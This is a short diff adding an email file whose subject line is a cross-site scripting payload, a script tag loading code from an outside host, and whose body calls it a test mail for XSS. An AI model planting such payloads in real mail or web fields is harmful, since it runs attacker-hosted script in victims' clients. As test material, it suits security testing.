@@ -1,0 +1,7 @@
+From: "Alphonse Mcintyre" <gary@humanwebspace.com>
+To: john.best@enron.com
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
